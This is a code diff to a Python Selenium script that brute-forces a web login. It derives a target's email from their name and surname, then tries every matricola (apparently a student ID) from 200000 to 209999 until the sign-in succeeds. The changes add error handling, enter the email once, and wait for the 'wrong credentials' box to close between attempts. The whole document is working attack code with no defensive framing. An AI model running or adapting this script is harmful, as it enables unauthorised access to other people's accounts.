@@ -17,21 +17,23 @@ driver.get(url)
 # wait for the page to be loaded
 wait = WebDriverWait(driver, 20)
 
-wait.until(EC.visibility_of_element_located((By.ID, "email_address")))
-
+try:
+  wait.until(EC.visibility_of_element_located((By.ID, "email_address")))
+except:
+  print('Webpage not available')
+ 
 # get email and matricola values from the page
 print('Login: ' + name + ' ' + surname)
 email = name.lower()+'.'+surname.lower()
 email = email.replace(" ","")
 print('Mail:'+email)
-matricola = 202352
+
+driver.find_element_by_id('email_address').send_keys(email)
 
 for matricola in range(200000,210000):
-  driver.find_element_by_id('email_address').clear()
   driver.find_element_by_id('matricola').clear()
 
   # write values in the page
-  driver.find_element_by_id('email_address').send_keys(email)
   driver.find_element_by_id('matricola').send_keys(matricola)
   driver.find_element_by_id('signin').click()
   try:
@@ -41,6 +43,7 @@ for matricola in range(200000,210000):
     break
   try:
     driver.find_element_by_xpath('//*[@id="container"]/div[2]/div[1]/button').click()
+    wait.until_not(EC.visibility_of_element_located((By.XPATH, '//*[@id="container"]/div[2]/div[1]/button')))
   except:
     print('box of wrong credentials not found')
 
